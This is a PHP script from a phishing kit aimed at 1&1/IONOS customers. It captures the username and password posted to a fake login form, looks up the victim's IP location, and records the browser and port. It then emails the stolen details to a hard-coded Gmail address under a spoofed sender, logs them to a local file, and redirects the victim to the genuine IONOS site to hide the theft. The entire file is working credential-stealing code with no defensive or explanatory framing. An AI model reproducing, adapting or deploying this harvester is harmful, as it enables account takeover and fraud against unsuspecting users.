<?php

session_start();
$ip = $_SERVER['REMOTE_ADDR'];
$time = date("m-d-Y g:i:a");
$details = json_decode(file_get_contents("http://ipinfo.io/{$ip}"));
$country = $details->country;
$state = $details->region;
$city = $details->city;
$browser = $_SERVER['HTTP_USER_AGENT'];
$port = getenv("REMOTE_PORT");

$msg = "--------------< Bex >-----------------------------\n";
$msg .= "User: ".$_POST['userID']."\n";
$msg .= "Password: ".$_POST['password']."\n";
$msg .= "-------------------------------------------------------\n";
$msg .= "Sent from $ip on $time\n";
$msg .= "Country: '$country' | State: '$state' | City: '$city' | 'Port : $port'\n";
$msg .= "Agent: '$browser'\n";
$msg .= "-------------------------------------------------------\n";


$to = "abarnesm02@gmail.com";
$subject = "1&1 | $ip | $country | $state";
$from = "From: aim@support.com";

mail($to,$subject,$msg,$from,$file);

$file = fopen("site.txt", "a+");
fwrite($file, $msg);
fclose($file);

  {
		   header("Location: https://www.ionos.com/");

	   }
?>